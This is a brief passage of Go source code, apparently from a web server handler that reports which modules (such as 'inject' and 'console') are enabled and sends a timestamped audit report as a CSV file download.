		"inject":  s.cfg.EnableInject,
		"console": true,
	}
	rep := audit.BuildReport(s.version, s.cfg.Elevated, modules)
	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition",
		fmt.Sprintf(`attachment; filename="obliteratus_audit_%s.csv"`, time.Now().Format("20060102_150405")))
	_, _ = w.Write([]byte(rep.CSV()))
}
